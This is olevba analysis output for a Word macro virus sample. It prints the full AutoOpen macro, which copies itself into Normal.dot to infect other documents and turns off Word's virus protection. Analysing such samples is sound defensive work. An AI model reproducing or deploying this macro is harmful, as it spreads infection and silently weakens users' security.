olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Minimal.bx
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Minimal.bx - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Virus.MSWord.Minimal.bx - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error Resume Next
Dim l
Dim s
Dim i


s = Word.ActiveDocument.FullName
l = "C:\Program Files\Microsoft Office\Templates\Normal.dot"
With ActiveDocument
        .UpdateStylesOnOpen = False
        .AttachedTemplate = "Normal"
    End With
Application.OrganizerCopy Source:=s, Destination:=l, Name:="Module1", Object:=wdOrganizerObjectProjectItems
        
  
        
With ActiveDocument
        .UpdateStylesOnOpen = False
        .AttachedTemplate = "Normal"
    End With
    Application.OrganizerCopy Source:=l, Destination:=s, Name:="Module1", Object:=wdOrganizerObjectProjectItems






    With Options
        .Pagination = True
        .WPHelp = False
        .WPDocNavKeys = False
        .ShortMenuNames = False
        .RTFInClipboard = True
        .BlueScreen = False
        .EnableSound = False
        .ConfirmConversions = False
        .UpdateLinksAtOpen = True
        .SendMailAttach = True
        .MeasurementUnit = wdMillimeters
        .AnimateScreenMovements = True
        .VirusProtection = False
        .ConvertHighAnsiToFarEast = True
    End With
    
    ActiveDocument.Save
    i = Date
    If Year(i) = 1998 Then
        ActiveDocument.Save
    ActiveDocument.Close
   Else
   End If
    ActiveDocument.Save

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+----------+--------------------+---------------------------------------------+

